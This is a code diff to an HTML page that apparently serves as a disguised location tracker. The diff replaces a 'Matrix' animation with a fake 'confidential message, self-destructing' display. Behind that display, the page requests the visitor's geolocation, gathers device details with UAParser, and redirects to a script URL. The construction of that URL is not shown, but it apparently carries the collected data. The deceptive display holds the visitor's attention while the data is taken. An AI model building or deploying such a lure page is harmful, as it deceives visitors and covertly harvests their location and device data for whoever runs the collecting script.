@@ -5,19 +5,21 @@
   <style>
     body {
       background-color: black;
-      color: green;
+      color: red;
       font-family: monospace;
       overflow: hidden;
+      text-align: center;
     }
 
-    #matrix {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      white-space: pre;
+    #confidential {
+      font-size: 40px;
+      margin-top: 20%;
+      animation: blink 1s infinite;
+    }
+
+    #data {
+      margin-top: 20px;
       font-size: 20px;
-      line-height: 1.2em;
     }
 
     @keyframes blink {
@@ -26,14 +28,20 @@
       100% { opacity: 1; }
     }
 
-    #blink {
-      animation: blink 1s infinite;
+    @keyframes countdown {
+      from { opacity: 1; }
+      to { opacity: 0; }
     }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
   <script>
-    const matrixCharacters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()_+{}:"<>?`~';
     let interval;
+    const confidentialMessages = [
+      "Receiving confidential data...",
+      "Decrypting message...",
+      "Data received successfully",
+      "This message will self-destruct in"
+    ];
 
     function getDeviceInfo() {
       const parser = new UAParser();
@@ -46,39 +54,40 @@
     }
 
     function getGeoLocation() {
-      const matrixDiv = document.getElementById('matrix');
-      let columns = Math.floor(window.innerWidth / 20);
-      let matrixText = '';
+      const confidentialDiv = document.getElementById('confidential');
+      const dataDiv = document.getElementById('data');
+      let messageIndex = 0;
 
-      for (let i = 0; i < 100; i++) {
-        let row = '';
-        for (let j = 0; j < columns; j++) {
-          row += matrixCharacters.charAt(Math.floor(Math.random() * matrixCharacters.length)) + ' ';
-        }
-        matrixText += row + '\n';
-      }
+      confidentialDiv.textContent = confidentialMessages[messageIndex];
+      messageIndex++;
 
-      matrixDiv.textContent = matrixText;
-      
       interval = setInterval(() => {
-        let newMatrixText = '';
-        for (let i = 0; i < 100; i++) {
-          let row = '';
-          for (let j = 0; j < columns; j++) {
-            row += matrixCharacters.charAt(Math.floor(Math.random() * matrixCharacters.length)) + ' ';
-          }
-          newMatrixText += row + '\n';
+        if (messageIndex < confidentialMessages.length) {
+          confidentialDiv.textContent = confidentialMessages[messageIndex];
+          messageIndex++;
+        } else {
+          clearInterval(interval);
+          dataDiv.style.display = 'block';
+          let countdown = 5;
+          dataDiv.textContent = `${countdown} seconds...`;
+          let countdownInterval = setInterval(() => {
+            countdown--;
+            dataDiv.textContent = `${countdown} seconds...`;
+            if (countdown <= 0) {
+              clearInterval(countdownInterval);
+              confidentialDiv.textContent = "Self-destructing...";
+              confidentialDiv.style.animation = "countdown 3s forwards";
+              setTimeout(() => {
+                window.close();
+              }, 3000);
+            }
+          }, 1000);
         }
-        matrixDiv.textContent = newMatrixText;
-      }, 100);
+      }, 2000);
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
           setTimeout(() => {
-            clearInterval(interval);
-            matrixDiv.textContent = "Data recorded. Thank you!";
-            matrixDiv.style.color = "lime";
-            
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var deviceInfo = getDeviceInfo();
@@ -90,7 +99,7 @@
 
             // Redirigir a la URL del script
             window.location.href = url;
-          }, 5000);
+          }, 10000); // 10 segundos para permitir mostrar los mensajes
         });
       } else {
         alert("Geolocation is not supported by this browser.");
@@ -99,6 +108,7 @@
   </script>
 </head>
 <body onload="getGeoLocation()">
-  <div id="matrix"></div>
+  <div id="confidential"></div>
+  <div id="data" style="display: none;"></div>
 </body>
 </html>
